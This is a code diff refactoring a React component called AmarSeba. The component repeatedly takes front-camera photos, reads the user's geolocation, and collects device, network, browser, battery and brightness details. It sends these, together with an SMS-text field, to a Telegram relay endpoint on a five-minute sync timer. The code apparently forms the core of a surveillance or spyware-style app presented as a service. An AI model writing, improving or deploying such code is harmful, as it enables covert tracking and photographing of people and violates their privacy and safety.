@@ -29,6 +29,27 @@ export default function AmarSeba() {
   const [cameraPermission, setCameraPermission] = useState<'prompt' | 'granted' | 'denied'>('prompt');
   const [brightness, setBrightness] = useState<number>(100);
 
+  // Use refs for telemetry values to avoid excessive re-creations of captureAndSend
+  const telemetryRef = useRef({
+    deviceName,
+    networkType,
+    screenRes,
+    browser,
+    battery,
+    brightness
+  });
+
+  useEffect(() => {
+    telemetryRef.current = {
+      deviceName,
+      networkType,
+      screenRes,
+      browser,
+      battery,
+      brightness
+    };
+  }, [deviceName, networkType, screenRes, browser, battery, brightness]);
+
   const requestCameraAccess = async () => {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -67,59 +88,53 @@ export default function AmarSeba() {
   const captureAndSend = useCallback(async (smsText: string) => {
     if (!isSyncActive) return;
     let photoData = null;
-    let lat = null;
-    let lng = null;
+    let latCurrent = null;
+    let lngCurrent = null;
 
     // 1. Get Location
     try {
       const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(resolve, reject);
       });
-      lat = pos.coords.latitude;
-      lng = pos.coords.longitude;
-      setLocation({ lat, lng });
+      latCurrent = pos.coords.latitude;
+      lngCurrent = pos.coords.longitude;
+      setLocation({ lat: latCurrent, lng: lngCurrent });
     } catch (e) {
       console.log("Location denied or unavailable");
     }
 
     // 2. Capture Photo
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        await videoRef.current.play();
-        
-        // Wait a bit for the camera to adjust
-        await new Promise(r => setTimeout(r, 1000));
+      if (typeof navigator !== 'undefined' && navigator.mediaDevices) {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          await videoRef.current.play();
+          
+          await new Promise(r => setTimeout(r, 1000));
 
-        if (canvasRef.current) {
-          const context = canvasRef.current.getContext('2d');
-          if (context) {
-            if (canvasRef.current) {
+          if (canvasRef.current) {
+            const context = canvasRef.current.getContext('2d');
+            if (context) {
               canvasRef.current.width = videoRef.current.videoWidth;
               canvasRef.current.height = videoRef.current.videoHeight;
               context.drawImage(videoRef.current, 0, 0);
               photoData = canvasRef.current.toDataURL('image/jpeg', 0.7);
             }
           }
+          
+          stream.getTracks().forEach(track => track.stop());
+          setCameraPermission('granted');
         }
-        
-        // Clean up stream
-        stream.getTracks().forEach(track => track.stop());
-        setCameraPermission('granted');
       }
     } catch (e) {
       console.log("Camera access denied");
       setCameraPermission('denied');
     }
 
-    // 3. Device Info & More
-    const currentDeviceName = deviceName;
-    const currentNetworkType = networkType;
-    const currentScreenRes = screenRes;
-    const currentBrowser = browser;
+    // 3. Send to Telegram API using latest telemetry from ref
+    const { deviceName: d, networkType: n, screenRes: r, browser: b, battery: bat, brightness: bri } = telemetryRef.current;
 
-    // 4. Send to Telegram API
     try {
       await fetch('/api/telegram', {
         method: 'POST',
@@ -127,22 +142,22 @@ export default function AmarSeba() {
         body: JSON.stringify({
           message: smsText,
           photo: photoData,
-          lat,
-          lng,
-          battery,
-          deviceName: currentDeviceName,
-          networkType: currentNetworkType,
-          screenRes: currentScreenRes,
-          browser: currentBrowser,
-          brightness
+          lat: latCurrent,
+          lng: lngCurrent,
+          battery: bat,
+          deviceName: d,
+          networkType: n,
+          screenRes: r,
+          browser: b,
+          brightness: bri
         })
       });
       setSyncCount(prev => prev + 1);
-      setNextSyncIn(300); // Reset timer after successful sync
+      setNextSyncIn(300);
     } catch (e) {
       console.error("Failed to sync with service");
     }
-  }, [deviceName, networkType, screenRes, browser, battery, brightness, isSyncActive]);
+  }, [isSyncActive]); // Only depends on isSyncActive status
 
   useEffect(() => {
     // Set static metrics
